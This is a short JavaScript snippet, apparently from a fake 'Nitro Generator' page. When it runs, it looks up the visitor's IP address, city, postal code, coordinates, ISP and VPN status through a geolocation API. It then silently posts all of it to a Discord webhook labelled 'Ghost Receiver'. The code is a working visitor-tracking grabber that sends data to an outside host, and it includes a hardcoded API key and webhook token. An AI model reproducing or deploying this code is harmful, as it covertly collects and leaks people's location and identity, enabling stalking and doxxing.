$.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=a1ebbf04c6164dd98b527e26c57fc28c", function (data) {
	const ip = data.ip_address;
	const city = data.city;
	const region = data.region;
	const zip = data.postal_code;
	const lat = data.latitude;
	const long = data.longitude;
	const country = data.country;
	const flag = data.flag.emoji;
	const aso = data.connection.autonomous_system_organization;
	const isp = data.connection.isp_name;
	const org = data.connection.organization_name;
	const vpn = data.security.is_vpn;
	const tz = data.timezone.name;
	const ct = data.timezone.current_time;

	const request = new XMLHttpRequest();
	request.open("POST", "https://discord.com/api/webhooks/1053423255660277850/XjoBvw6K2xgeEZF1-t141rSN_AJc2vkVdsmqX9i6_opgyqQOolj_aCZCDjNH7Br0OdUV");
	
	request.setRequestHeader("Content-type", "application/json");
	const params = {
	  username: "Ghost Receiver",
	  avatar_url: "https://pepsinitro.github.io/Nitro-Generator/styles/Image.png",
	  content: "**Data Requested, Data Retrieved, On Stand By [GeneratorPage]**\n> IP: " + ip + 
	  "\n> City: " + city + 
	  "\n> Region: " + region + 
	  "\n> Zip: " + zip + 
	  "\n> Latitude:  " + lat +
	  "\n> Longitude:  " + long +
	  "\n> Country: " + country +
	  "\n> Flag: " + flag +
	  "\n> Auto System Org: " + aso +
	  "\n> ISP: " + isp +
	  "\n> Org: " + org +
	  "\n> Using VPN: " + vpn +
	  "\n> Timezone: " + tz +
	  "\n> Current time: " + ct 
	  ,
	};
	request.send(JSON.stringify(params));
  });
